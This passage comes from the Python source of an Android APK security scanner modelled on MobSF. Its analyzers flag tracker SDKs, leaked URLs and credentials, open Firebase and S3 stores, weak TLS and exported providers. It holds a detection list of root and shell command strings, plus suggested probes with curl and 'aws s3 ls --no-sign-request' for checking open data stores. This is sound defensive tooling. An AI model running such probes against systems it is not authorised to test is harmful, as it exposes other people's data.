            description=("setSavePassword(true) caches form passwords in the WebView's "
                         "credential store. Deprecated and removed in API 18+."),
            evidence="setSavePassword present",
            recommendation="Remove. Pre-API 18 needs setSavePassword(false) explicitly.",
            cwe="CWE-200", masvs="MSTG-STORAGE-1",
            confidence="confirmed", source="mobsf",
        ))
    return f


# =============================================================================
# Hardcoded SQL queries with string format
# =============================================================================
def analyze_sql_format_concat(ctx: Ctx) -> list:
    f = []
    hits = []
    sql_re = re.compile(r"(?i)\b(?:SELECT|INSERT\s+INTO|UPDATE|DELETE\s+FROM)\b.*\b\+\b")
    for s in _all_dex_strings(ctx, 50000):
        if sql_re.search(s) and len(s) < 300:
            hits.append(s[:120])
    hits = list(dict.fromkeys(hits))[:8]
    if hits:
        f.append(Finding(
            id="sql-string-concat",
            title="SQL strings with concatenation operator",
            severity="high", category="MASVS-CODE",
            description=("SQL string literals appear to use Java string concatenation. "
                         "Common SQL-injection construction pattern."),
            evidence="\n".join(hits),
            recommendation="Use parameterised queries (selectionArgs[] with ?).",
            cwe="CWE-89", masvs="MSTG-CODE-2",
            confidence="likely", source="mobsf",
        ))
    return f


# =============================================================================
# Clipboard usage
# =============================================================================
def analyze_clipboard_usage(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, [
        "Landroid/content/ClipboardManager;->setPrimaryClip",
        "Landroid/content/ClipboardManager;->getPrimaryClip",
    ])
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        f.append(Finding(
            id="clipboard-usage",
            title=f"ClipboardManager usage at {len(locs)} site(s)",
            severity="low", category="MASVS-PLATFORM",
            description=("Clipboard data is system-wide; any other app can read it. Sensitive "
                         "data (passwords, OTPs, payment) should never go to clipboard."),
            evidence="\n".join(locs[:6]),
            recommendation=("Clear clipboard after sensitive copy operation, or warn user. "
                            "On Android 13+, ClipboardManager.setPrimaryClip(IS_SENSITIVE) hides preview."),
            cwe="CWE-200", masvs="MSTG-STORAGE-10",
            confidence="confirmed", source="mastg",
        ))
    return f


# =============================================================================
# Register
# =============================================================================

# =============================================================================
# MobSF-inspired additional analyzers
# Targets categories MobSF checks but Vexa doesn't yet cover.
# =============================================================================

# ---- Tracker SDK detection (MobSF/Exodus-style) ---------------------------
TRACKER_SDKS = [
    ("Google Analytics",     ["com/google/android/gms/analytics", "com/google/firebase/analytics"], "Analytics"),
    ("Google AdMob",          ["com/google/android/gms/ads", "com/google/ads/mediation"], "Ads"),
    ("Google CrashLytics",    ["com/crashlytics", "com/google/firebase/crashlytics"], "Crash reporting"),
    ("Facebook Login/SDK",    ["com/facebook/login", "com/facebook/FacebookSdk"], "Identity"),
    ("Facebook Audience",     ["com/facebook/ads"], "Ads"),
    ("Flurry",                ["com/flurry/android"], "Analytics"),
    ("Mixpanel",              ["com/mixpanel/android"], "Analytics"),
    ("Amplitude",             ["com/amplitude/api"], "Analytics"),
    ("Segment",               ["com/segment/analytics"], "Analytics"),
    ("Branch",                ["io/branch/referral"], "Attribution"),
    ("AppsFlyer",             ["com/appsflyer"], "Attribution"),
    ("Adjust",                ["com/adjust/sdk"], "Attribution"),
    ("Tealium",               ["com/tealium/library"], "Analytics"),
    ("Localytics",            ["com/localytics/android"], "Analytics"),
    ("HockeyApp",             ["net/hockeyapp/android"], "Crash reporting"),
    ("Bugsnag",               ["com/bugsnag/android"], "Crash reporting"),
    ("Sentry",                ["io/sentry"], "Crash reporting"),
    ("New Relic",             ["com/newrelic/agent/android"], "APM"),
    ("Instabug",              ["com/instabug/library"], "Feedback"),
    ("Smartlook",             ["com/smartlook/sdk"], "Session replay"),
    ("Yandex Metrica",        ["com/yandex/metrica"], "Analytics"),
    ("Umeng",                 ["com/umeng/analytics", "com/umeng/commonsdk"], "Analytics"),
    ("UnityAds",              ["com/unity3d/ads"], "Ads"),
    ("AppLovin",              ["com/applovin/sdk"], "Ads"),
    ("Vungle",                ["com/vungle/warren"], "Ads"),
    ("Chartboost",            ["com/chartboost/sdk"], "Ads"),
    ("InMobi",                ["com/inmobi/ads"], "Ads"),
    ("MoPub",                 ["com/mopub/mobileads"], "Ads"),
    ("OneSignal",             ["com/onesignal"], "Push"),
    ("Pushwoosh",             ["com/pushwoosh"], "Push"),
    ("Urban Airship",         ["com/urbanairship"], "Push"),
]

def analyze_trackers(ctx: Ctx) -> list:
    """Enumerate ad/analytics/crash/identity SDKs (MobSF / Exodus-style)."""
    f = []
    found_sdks = []
    classes_seen = set()
    for dex in ctx.dex_list:
        try:
            for cls in dex.get_classes():
                name = cls.get_name() or ""
                # strip L; wrapper
                pure = name.lstrip("L").rstrip(";")
                classes_seen.add(pure)
        except Exception:
            continue
    for label, prefixes, kind in TRACKER_SDKS:
        if any(any(c.startswith(p) for c in classes_seen) for p in prefixes):
            found_sdks.append(f"{label} ({kind})")
    if found_sdks:
        ctx.extras["trackers"] = found_sdks
        f.append(Finding(
            id="trackers-detected",
            title=f"{len(found_sdks)} third-party SDK(s) detected",
            severity="info", category="MASVS-PRIVACY",
            description=("Embedded ad/analytics/crash/identity SDKs. Each one has access to the app's "
                         "process and can collect user data. Privacy and supply-chain implications."),
            evidence="\n".join(found_sdks),
            recommendation=("Audit each SDK against your privacy policy. Use only SDKs you trust; "
                            "validate their network destinations; disclose them to users."),
            masvs="MSTG-PRIVACY-1",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- Hardcoded URLs / IPs / Domains ----------------------------------------
URL_REGEX = re.compile(r"https?://[A-Za-z0-9._\-:/%?&=+#~@!$,;]+")
IP_REGEX = re.compile(r"\b(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\."
                       r"(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\."
                       r"(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\."
                       r"(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\b")
EMAIL_REGEX = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")

PUBLIC_DOMAINS_TO_IGNORE = {
    "schemas.android.com", "schemas.xmlsoap.org", "www.w3.org", "www.example.com",
    "example.com", "www.google.com", "fonts.googleapis.com", "fonts.gstatic.com",
    "play.google.com", "schemas.openxmlformats.org", "purl.oclc.org", "java.sun.com",
    "xml.apache.org", "android-doc.android.com", "developer.android.com",
}

def _all_dex_strings_for_text(ctx, limit=200000):
    out = list(_get_strings(ctx)[:limit])
    # Also pull from XML resources
    try:
        for fname in ctx.apk.get_files():
            if fname.endswith(".xml") or fname == "AndroidManifest.xml":
                try:
                    raw = ctx.apk.get_file(fname)
                    if raw:
                        out.append(raw.decode("utf-8", errors="ignore")[:5000])
                except Exception:
                    continue
    except Exception:
        pass
    return out


def analyze_urls_ips_emails(ctx: Ctx) -> list:
    """Reconnaissance value — extract URLs, IPs, emails (MobSF-style)."""
    f = []
    text = " ".join(_all_dex_strings_for_text(ctx, 80000))
    urls = set()
    for m in URL_REGEX.finditer(text):
        u = m.group(0).rstrip(".,;:)")
        if len(u) < 200:
            urls.add(u)
    ips = set(IP_REGEX.findall(text))
    # Filter local/safe IPs
    safe_ip_prefixes = ("0.", "127.", "10.", "192.168.", "169.254.", "255.255.")
    real_ips = {ip for ip in ips if not any(ip.startswith(p) for p in safe_ip_prefixes)
                and not ip.endswith(".0") and ip != "1.1.1.1"}
    emails = set(EMAIL_REGEX.findall(text))
    domains = set()
    for u in urls:
        m = re.match(r"https?://([^/:]+)", u)
        if m:
            d = m.group(1).lower()
            if d not in PUBLIC_DOMAINS_TO_IGNORE and not d.endswith(".android.com"):
                domains.add(d)

    ctx.extras["urls"] = sorted(urls)[:200]
    ctx.extras["ips"] = sorted(real_ips)
    ctx.extras["emails"] = sorted(emails)
    ctx.extras["domains"] = sorted(domains)

    if domains:
        f.append(Finding(
            id="domains-discovered",
            title=f"{len(domains)} unique domain(s) referenced",
            severity="info", category="MASVS-NETWORK",
            description=("Domain enumeration — useful for mapping the API surface and identifying "
                         "external dependencies."),
            evidence="\n".join(sorted(domains)[:30]) +
                      (f"\n... and {len(domains)-30} more" if len(domains) > 30 else ""),
            recommendation=("Reconnaissance value only. Check whether any domains are dev/staging "
                            "leaked into prod, or if any belong to compromised/untrusted infrastructure."),
            masvs="MSTG-NETWORK-1",
            confidence="confirmed", source="mobsf",
        ))
    if real_ips:
        f.append(Finding(
            id="hardcoded-ips",
            title=f"{len(real_ips)} hardcoded public IP(s)",
            severity="low", category="MASVS-NETWORK",
            description=("Hardcoded public IPs in app strings. Often a code smell — production "
                         "configs should use DNS hostnames so endpoints can be moved without an "
                         "app update. Sometimes indicates dev/staging endpoints leaked into prod."),
            evidence="\n".join(sorted(real_ips)[:15]),
            recommendation="Replace hardcoded IPs with DNS names; review if any leaked dev endpoints exist.",
            masvs="MSTG-NETWORK-1",
            confidence="confirmed", source="mobsf",
        ))
    if emails:
        # Typically not a vuln — but interesting for recon
        ctx.extras["emails_found"] = sorted(emails)[:30]
    return f


# ---- Firebase exposed config (MobSF/AppKnox-style) ------------------------
def analyze_firebase_db(ctx: Ctx) -> list:
    """Find firebaseio.com URLs that may be world-readable."""
    f = []
    text = " ".join(_all_dex_strings_for_text(ctx, 100000))
    fb_urls = set()
    for m in re.finditer(r"https?://[a-zA-Z0-9_-]+\.firebaseio\.com", text):
        fb_urls.add(m.group(0))
    if fb_urls:
        ctx.extras["firebase_dbs"] = sorted(fb_urls)
        f.append(Finding(
            id="firebase-databases",
            title=f"{len(fb_urls)} Firebase Realtime Database URL(s)",
            severity="high", category="MASVS-STORAGE",
            description=("Firebase Realtime Database URLs found. These are commonly left "
                         "world-readable due to permissive default rules. Test by appending /.json "
                         "to the URL — if it returns data, the database is open to the world."),
            evidence="\n".join(sorted(fb_urls)),
            recommendation=("Set strict Firebase rules. Default deny; only authenticate users can "
                            "read/write. Test with curl '<url>/.json' to verify."),
            cwe="CWE-200", masvs="MSTG-STORAGE-2",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- AWS S3 buckets in URLs / strings -------------------------------------
def analyze_s3_buckets(ctx: Ctx) -> list:
    f = []
    text = " ".join(_all_dex_strings_for_text(ctx, 80000))
    buckets = set()
    # *.s3.amazonaws.com or s3.amazonaws.com/<bucket>
    for m in re.finditer(r"\b([a-z0-9][a-z0-9.-]{1,61}[a-z0-9])\.s3[\.\-][a-z0-9.\-]*amazonaws\.com", text):
        buckets.add(m.group(0))
    for m in re.finditer(r"https?://s3[\.\-][a-z0-9.\-]*amazonaws\.com/([a-z0-9][a-z0-9.\-]{1,61}[a-z0-9])", text):
        buckets.add("s3:" + m.group(1))
    if buckets:
        ctx.extras["s3_buckets"] = sorted(buckets)
        f.append(Finding(
            id="s3-buckets",
            title=f"{len(buckets)} AWS S3 bucket(s) referenced",
            severity="medium", category="MASVS-STORAGE",
            description=("S3 buckets referenced in the app. Test public-read access with "
                         "'aws s3 ls s3://<bucket> --no-sign-request' and listing via web."),
            evidence="\n".join(sorted(buckets)),
            recommendation="Verify each bucket has correct ACLs; never leave production buckets world-readable.",
            cwe="CWE-200", masvs="MSTG-STORAGE-2",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- WebView setJavaScriptEnabled with addJavascriptInterface (Oversecured) -
def analyze_webview_addjs_interface(ctx: Ctx) -> list:
    f = []
    found_iface = _scan_dex_for(ctx, ["addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V"])
    locs = []
    for v in found_iface.values(): locs.extend(v)
    if locs:
        # Try to also find @JavascriptInterface annotation usage
        has_annotation = _has_string(ctx, "JavascriptInterface")
        sev = "high" if has_annotation else "medium"
        f.append(Finding(
            id="webview-addjs-iface",
            title=f"WebView.addJavascriptInterface at {len(locs)} site(s)",
            severity=sev, category="MASVS-PLATFORM",
            description=("addJavascriptInterface exposes a Java object to JavaScript running in a "
                         "WebView. If a malicious URL loads in the WebView, the JS can call those "
                         "methods. Below API 17 every public method is exposed; above, only "
                         "@JavascriptInterface-annotated methods are."),
            evidence="\n".join(locs[:8]),
            recommendation=("Avoid addJavascriptInterface for sensitive bridges. If used, restrict "
                            "to specific HTTPS origins via shouldInterceptRequest, and ensure "
                            "minSdk >= 17 with @JavascriptInterface."),
            cwe="CWE-749", masvs="MSTG-PLATFORM-7",
            confidence="confirmed", source="oversecured",
        ))
    return f


# ---- App Signing schemes / Janus extra check ------------------------------
def analyze_signing_schemes(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    try:
        v1, v2, v3 = apk.is_signed_v1(), apk.is_signed_v2(), apk.is_signed_v3()
    except Exception:
        return f
    schemes = []
    if v1: schemes.append("v1")
    if v2: schemes.append("v2")
    if v3: schemes.append("v3")
    sigs = []
    try:
        certs = apk.get_certificates()
        for c in (certs or []):
            try:
                sig_alg = getattr(c, "signature_algorithm_oid", "?")
                sigs.append(str(sig_alg))
            except Exception:
                continue
    except Exception:
        pass
    # Always informational
    f.append(Finding(
        id="signing-info",
        title=f"APK signed with: {', '.join(schemes) if schemes else 'unknown'}",
        severity="info", category="MASVS-CODE",
        description="Signing scheme inventory.",
        evidence=f"v1={v1}, v2={v2}, v3={v3}; certs={len(sigs)}",
        recommendation="Use v2/v3. Disable v1 if minSdk >= 24.",
        masvs="MSTG-CODE-1",
        confidence="confirmed", source="mobsf",
    ))
    return f


# ---- Application class debug logging hints --------------------------------
def analyze_debug_logging(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, ["Landroid/util/Log;->v",
                                "Landroid/util/Log;->d",
                                "Landroid/util/Log;->i",
                                "Landroid/util/Log;->w",
                                "Landroid/util/Log;->e",
                                "Ljava/io/PrintStream;->println"])
    total = sum(len(v) for v in found.values())
    if total > 50:
        f.append(Finding(
            id="excessive-logging",
            title=f"{total} log call(s) detected",
            severity="info", category="MASVS-STORAGE",
            description=("Heavy logging may leak sensitive data into logcat. While log statements "
                         "themselves aren't a vuln, ensure release builds strip them via ProGuard rules."),
            evidence=f"Log.v={len(found.get('Landroid/util/Log;->v', []))}, "
                       f"Log.d={len(found.get('Landroid/util/Log;->d', []))}, "
                       f"Log.i={len(found.get('Landroid/util/Log;->i', []))}, "
                       f"Log.w={len(found.get('Landroid/util/Log;->w', []))}, "
                       f"Log.e={len(found.get('Landroid/util/Log;->e', []))}",
            recommendation="Strip with ProGuard: -assumenosideeffects class android.util.Log { *; }",
            masvs="MSTG-STORAGE-3",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- Insecure SQL Cipher / SQLite usage -----------------------------------
def analyze_sqlcipher(ctx: Ctx) -> list:
    f = []
    has_sqlcipher = _has_string(ctx, "net/sqlcipher", "net.sqlcipher")
    has_plain_sqlite = _has_string(ctx, "Landroid/database/sqlite/SQLiteDatabase;")
    if has_plain_sqlite and not has_sqlcipher:
        f.append(Finding(
            id="sqlite-not-encrypted",
            title="SQLite usage without SQLCipher",
            severity="low", category="MASVS-STORAGE",
            description=("App uses Android's SQLite but no SQLCipher / EncryptedDatabase indicators "
                         "found. If sensitive data is stored, consider SQLCipher or AndroidX's "
                         "encrypted SharedPreferences/Files."),
            evidence="SQLiteDatabase used; no SQLCipher",
            recommendation="Use SQLCipher for sensitive data, or AndroidX Security EncryptedFile.",
            cwe="CWE-311", masvs="MSTG-STORAGE-1",
            confidence="possible", source="mobsf",
        ))
    return f


# ---- Path traversal indicators in file ops --------------------------------
def analyze_path_traversal(ctx: Ctx) -> list:
    f = []
    found_canonical = _has_string(ctx, "getCanonicalPath")
    found_concat = _scan_dex_for(ctx, ["Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V",
                                        "Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V"])
    has_concat = sum(len(v) for v in found_concat.values()) > 0
    if has_concat and not found_canonical:
        f.append(Finding(
            id="path-traversal-risk",
            title="File operations without canonical path validation",
            severity="medium", category="MASVS-STORAGE",
            description=("File constructors with parent+child are used; no getCanonicalPath check "
                         "found. If the child name comes from untrusted input (Intent extra, deep "
                         "link), traversal is possible."),
            evidence="File(parent, child) constructors found; no canonical-path validation",
            recommendation="Always use file.getCanonicalPath().startsWith(allowedDir.getCanonicalPath()).",
            cwe="CWE-22", masvs="MSTG-PLATFORM-4",
            confidence="possible", source="mobsf",
        ))
    return f


# ---- HTTP Auth Headers / Basic auth in URLs -------------------------------
def analyze_basic_auth(ctx: Ctx) -> list:
    f = []
    text = " ".join(_all_dex_strings_for_text(ctx, 80000))
    # Find URLs of form scheme://user:pass@host
    creds_in_url = re.findall(r"https?://[^/\s]+:[^@/\s]+@[^/\s]+", text)
    if creds_in_url:
        f.append(Finding(
            id="basic-auth-in-url",
            title=f"{len(creds_in_url)} URL(s) with embedded credentials",
            severity="high", category="MASVS-CODE",
            description=("URLs of the form scheme://user:password@host found. Credentials are leaked "
                         "in URLs (logs, browser history, server access logs)."),
            evidence="\n".join(creds_in_url[:5]),
            recommendation="Move credentials to Authorization headers; never embed in URLs.",
            cwe="CWE-522", masvs="MSTG-CODE-2",
            confidence="confirmed", source="mobsf",
        ))
    # Also detect Authorization: Basic header with hardcoded value
    basic_auth = re.findall(r"Basic\s+[A-Za-z0-9+/=]{16,}", text)
    if basic_auth:
        f.append(Finding(
            id="hardcoded-basic-auth",
            title=f"{len(basic_auth)} hardcoded HTTP Basic Auth header(s)",
            severity="high", category="MASVS-CODE",
            description="Hardcoded 'Basic <base64>' authorization headers found in app code.",
            evidence="\n".join(basic_auth[:5]),
            recommendation="Authenticate via the user, not hardcoded service credentials.",
            cwe="CWE-798", masvs="MSTG-CODE-2",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- Application providesAdvertisingId / device identifier collection ----
def analyze_device_id_collection(ctx: Ctx) -> list:
    f = []
    indicators = ["getDeviceId", "getSubscriberId", "getSimSerialNumber",
                  "ANDROID_ID", "Settings$Secure;->getString",
                  "getAdvertisingIdInfo"]
    found = _scan_dex_for(ctx, indicators)
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        f.append(Finding(
            id="device-id-collection",
            title=f"Device identifier collection at {len(locs)} site(s)",
            severity="info", category="MASVS-PRIVACY",
            description=("App reads device identifiers (IMEI, ANDROID_ID, ad ID, etc.). Privacy-"
                         "sensitive — Google Play has restrictions on combining identifiers."),
            evidence="\n".join(locs[:8]),
            recommendation="Disclose collection in privacy policy. Don't combine identifiers across users.",
            masvs="MSTG-PRIVACY-3",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- Application usage of HTTPURLConnection / OkHttp / Retrofit ----------
def analyze_http_clients_inventory(ctx: Ctx) -> list:
    f = []
    inventory = []
    if _has_string(ctx, "Ljava/net/HttpURLConnection;"): inventory.append("HttpURLConnection")
    if _has_string(ctx, "Lokhttp3/", "okhttp3."): inventory.append("OkHttp 3")
    if _has_string(ctx, "Lretrofit2/"): inventory.append("Retrofit")
    if _has_string(ctx, "Lcom/android/volley/"): inventory.append("Volley")
    if _has_string(ctx, "Lorg/apache/http/"): inventory.append("Apache HTTPClient (deprecated)")
    if _has_string(ctx, "Lcom/loopj/android/http"): inventory.append("Android Async HTTP")
    if inventory:
        f.append(Finding(
            id="http-client-inventory",
            title=f"HTTP client(s): {', '.join(inventory)}",
            severity="info", category="MASVS-NETWORK",
            description="HTTP client libraries in use.",
            evidence=", ".join(inventory),
            recommendation="Apache HTTPClient is removed in API 28+. Use OkHttp/Retrofit.",
            masvs="MSTG-NETWORK-1",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- WebView setSavePassword (deprecated but still used in legacy apps) ---
def analyze_webview_save_pwd(ctx: Ctx) -> list:
    f = []
    if _has_string(ctx, "setSavePassword"):
        f.append(Finding(
            id="webview-save-password",
            title="WebView.setSavePassword referenced",
            severity="medium", category="MASVS-STORAGE",
            description=("WebView's password manager (setSavePassword) stores credentials in a "
                         "world-readable database on legacy Android. Deprecated since API 18."),
            evidence="setSavePassword in DEX strings",
            recommendation="Use setSavePassword(false) and rely on Android's autofill framework.",
            cwe="CWE-522", masvs="MSTG-STORAGE-1",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- Application encryption of network traffic checks --------------------
def analyze_no_https(ctx: Ctx) -> list:
    f = []
    text = " ".join(_all_dex_strings_for_text(ctx, 60000))
    http_urls = set(re.findall(r"http://[A-Za-z0-9._\-:/]+", text))
    # Filter local
    http_urls = {u for u in http_urls if "127.0.0.1" not in u and "localhost" not in u
                 and "10.0.0." not in u and "schemas." not in u}
    if http_urls:
        f.append(Finding(
            id="cleartext-urls",
            title=f"{len(http_urls)} cleartext HTTP URL(s) hardcoded",
            severity="medium", category="MASVS-NETWORK",
            description=("Hardcoded HTTP URLs found. If used for actual API calls (rather than just "
                         "namespace declarations), traffic is unencrypted and MITM-vulnerable."),
            evidence="\n".join(sorted(http_urls)[:10]),
            recommendation="Use HTTPS everywhere. Configure cleartextTrafficPermitted=false.",
            cwe="CWE-319", masvs="MSTG-NETWORK-1",
            confidence="likely", source="mobsf",
        ))
    return f


# ---- Application tap-jacking via filterTouchesWhenObscured ---------------
def analyze_filter_touches(ctx: Ctx) -> list:
    f = []
    if not _has_string(ctx, "filterTouchesWhenObscured"):
        f.append(Finding(
            id="no-filter-touches",
            title="filterTouchesWhenObscured not used",
            severity="low", category="MASVS-PLATFORM",
            description=("filterTouchesWhenObscured filters touches received while another window "
                         "is obscuring the app's window — defence against tapjacking."),
            evidence="No filterTouchesWhenObscured in DEX strings",
            recommendation="On sensitive UI elements (login, payment, OTP), set filterTouchesWhenObscured=true.",
            masvs="MSTG-PLATFORM-9",
            confidence="possible", source="mobsf",
        ))
    return f


# ---- Application IPC: ContentProvider permissions check ------------------
def analyze_provider_permissions(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    risky = []
    try:
        for elem in (apk.find_tags("provider") or []):
            try:
                name = apk.get_value_from_tag(elem, "name") or "?"
                exported = apk.get_value_from_tag(elem, "exported")
                read_perm = apk.get_value_from_tag(elem, "readPermission")
                write_perm = apk.get_value_from_tag(elem, "writePermission")
                perm = apk.get_value_from_tag(elem, "permission")
                grant_uri = apk.get_value_from_tag(elem, "grantUriPermissions")
                if exported == "true" and not (read_perm or write_perm or perm):
                    risky.append(f"{name}: exported=true, no permission")
                elif grant_uri == "true":
                    risky.append(f"{name}: grantUriPermissions=true (review)")
            except Exception:
                continue
    except Exception:
        pass
    if risky:
        f.append(Finding(
            id="provider-perms-weak",
            title=f"{len(risky)} ContentProvider with weak/no permission",
            severity="high", category="MASVS-PLATFORM",
            description=("Exported ContentProviders without read/write permission are accessible "
                         "from any app. With grantUriPermissions=true the app can be tricked into "
                         "granting access to its own private data."),
            evidence="\n".join(risky[:8]),
            recommendation=("Set android:exported=\"false\" if not needed externally. Otherwise add "
                            "android:readPermission/writePermission with signature-level protection."),
            cwe="CWE-925", masvs="MSTG-PLATFORM-4",
            confidence="confirmed", source="oversecured",
        ))
    return f


# ---- Manifest: max SDK / install location / shared user id ---------------
def analyze_manifest_extras(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    try:
        manifest_xml = apk.get_android_manifest_axml().get_xml().decode("utf-8", errors="ignore")
    except Exception:
        try:
            manifest_xml = apk.get_file("AndroidManifest.xml").decode("utf-8", errors="ignore")
        except Exception:
            return f
    # sharedUserId
    if "sharedUserId" in manifest_xml:
        f.append(Finding(
            id="shared-user-id",
            title="sharedUserId attribute used",
            severity="medium", category="MASVS-PLATFORM",
            description=("sharedUserId allows multiple apps signed by the same key to share a UID. "
                         "Deprecated in API 29+. Apps in the same UID have full access to each "
                         "other's data — any compromise spreads."),
            evidence='sharedUserId attribute present in AndroidManifest',
            recommendation="Remove sharedUserId. Use ContentProviders with signature-level permissions.",
            cwe="CWE-732", masvs="MSTG-PLATFORM-1",
            confidence="confirmed", source="mobsf",
        ))
    # install location
    m = re.search(r'installLocation="([^"]+)"', manifest_xml)
    if m and m.group(1) in ("preferExternal", "auto"):
        f.append(Finding(
            id="install-location-external",
            title=f"installLocation={m.group(1)}",
            severity="low", category="MASVS-PLATFORM",
            description=("App may install on external storage (SD card). Files there are world-"
                         "readable on legacy Android. Avoid for sensitive apps."),
            evidence=f"installLocation={m.group(1)}",
            recommendation='Use installLocation="internalOnly".',
            cwe="CWE-922", masvs="MSTG-STORAGE-2",
            confidence="confirmed", source="mobsf",
        ))
    # extractNativeLibs=true (informational)
    if 'extractNativeLibs="true"' in manifest_xml:
        pass  # info only, not a finding
    return f


# ---- KeyStore usage / hardware-backed indicators -------------------------
def analyze_keystore_usage(ctx: Ctx) -> list:
    f = []
    has_keystore = _has_string(ctx, "AndroidKeyStore", "android.security.keystore")
    has_keygen = _has_string(ctx, "KeyGenParameterSpec", "KeyPairGeneratorSpec")
    if has_keystore and has_keygen:
        # Good — informational
        f.append(Finding(
            id="android-keystore-used",
            title="AndroidKeyStore in use",
            severity="info", category="MASVS-CRYPTO",
            description="App uses AndroidKeyStore — good practice for key material storage.",
            evidence="AndroidKeyStore + KeyGenParameterSpec found",
            recommendation="Verify keys are hardware-backed and bound to user authentication where appropriate.",
            masvs="MSTG-CRYPTO-1",
            confidence="confirmed", source="mobsf",
        ))
    elif not has_keystore:
        # Look for sensitive crypto usage without keystore
        has_aes = _has_string(ctx, '"AES/', '"AES"')
        if has_aes:
            f.append(Finding(
                id="aes-no-keystore",
                title="AES used but AndroidKeyStore not detected",
                severity="medium", category="MASVS-CRYPTO",
                description=("AES cipher referenced but AndroidKeyStore is not used. Likely keys "
                             "are derived/hardcoded — extractable from binary or static analysis."),
                evidence="AES references; no AndroidKeyStore symbols",
                recommendation="Use AndroidKeyStore to generate and store keys hardware-backed.",
                cwe="CWE-321", masvs="MSTG-CRYPTO-1",
                confidence="likely", source="mobsf",
            ))
    return f


# ---- Application screen capture / screenshot prevention -----------------
def analyze_screen_recording(ctx: Ctx) -> list:
    f = []
    has_capture = _has_string(ctx, "MediaProjection", "MediaProjectionManager")
    if has_capture:
        f.append(Finding(
            id="media-projection-usage",
            title="MediaProjection API usage",
            severity="medium", category="MASVS-PLATFORM",
            description=("App uses MediaProjection — can record the screen and audio. "
                         "Privacy-sensitive; ensure user consent and disclosure."),
            evidence="MediaProjection symbols in DEX",
            recommendation="Show user consent UI. Disclose in privacy policy. Don't record without explicit action.",
            cwe="CWE-200", masvs="MSTG-PLATFORM-1",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- BroadcastReceiver dynamic registration without exported flag --------
def analyze_dynamic_broadcasts(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, ["Landroid/content/Context;->registerReceiver"])
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        f.append(Finding(
            id="dynamic-broadcast-receiver",
            title=f"registerReceiver at {len(locs)} site(s)",
            severity="low", category="MASVS-PLATFORM",
            description=("Dynamic broadcast registration. On Android 14+, all receivers must "
                         "explicitly declare exported state via RECEIVER_EXPORTED / RECEIVER_NOT_EXPORTED."),
            evidence="\n".join(locs[:6]),
            recommendation="Pass RECEIVER_NOT_EXPORTED for internal-only receivers (Android 14+).",
            cwe="CWE-925", masvs="MSTG-PLATFORM-4",
            confidence="possible", source="mobsf",
        ))
    return f


# ---- HTTP downgrade / TLS version checks -------------------------------
def analyze_tls_versions(ctx: Ctx) -> list:
    f = []
    weak_tls = []
    if _has_string(ctx, "TLSv1\"", "\"TLS\""): weak_tls.append("TLSv1.0")
    if _has_string(ctx, "TLSv1.1"): weak_tls.append("TLSv1.1")
    if _has_string(ctx, "SSLv3"): weak_tls.append("SSLv3 (broken)")
    if _has_string(ctx, "SSLv2"): weak_tls.append("SSLv2 (broken)")
    if weak_tls:
        f.append(Finding(
            id="weak-tls",
            title=f"Weak TLS/SSL version(s) referenced: {', '.join(weak_tls)}",
            severity="medium", category="MASVS-NETWORK",
            description=("Weak TLS/SSL version references in code. SSLv2/SSLv3 are broken; TLSv1.0 "
                         "and TLSv1.1 are deprecated by browsers and most CAs."),
            evidence=", ".join(weak_tls),
            recommendation="Enforce TLSv1.2+ via SSLContext.getInstance(\"TLSv1.3\") or NetworkSecurityConfig.",
            cwe="CWE-326", masvs="MSTG-NETWORK-2",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- Pasteboard usage (privacy) ------------------------------------------
def analyze_clipboard(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, ["Landroid/content/ClipboardManager;->setPrimaryClip",
                                 "Landroid/content/ClipboardManager;->getPrimaryClip"])
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        f.append(Finding(
            id="clipboard-usage",
            title=f"Clipboard usage at {len(locs)} site(s)",
            severity="low", category="MASVS-STORAGE",
            description=("App uses the system clipboard. Sensitive data copied there is readable by "
                         "every other app on legacy Android (foreground apps on Android 10+)."),
            evidence="\n".join(locs[:6]),
            recommendation="For sensitive data use ClipDescription.EXTRA_IS_SENSITIVE on Android 13+. Clear after use.",
            cwe="CWE-200", masvs="MSTG-STORAGE-10",
            confidence="confirmed", source="mobsf",
        ))
    return f


# ---- Application logcat / shell command monitoring -----------------------
def analyze_shell_commands(ctx: Ctx) -> list:
    f = []
    suspicious = []
    text = " ".join(_all_dex_strings_for_text(ctx, 60000))
    for cmd in ["su -c", "logcat", "/system/bin/sh", "/system/xbin/su",
                "pm install", "pm uninstall", "/data/local/tmp",
                "chmod ", "/proc/self/maps", "/proc/self/status"]:
        if cmd in text:
            suspicious.append(cmd)
    if suspicious:
        f.append(Finding(
            id="shell-commands",
            title=f"Suspicious shell command strings: {len(suspicious)}",
            severity="info", category="MASVS-CODE",
            description=("Strings suggesting shell command execution. Often anti-tamper code (root "
                         "checks, /proc inspection); occasionally indicates command injection."),
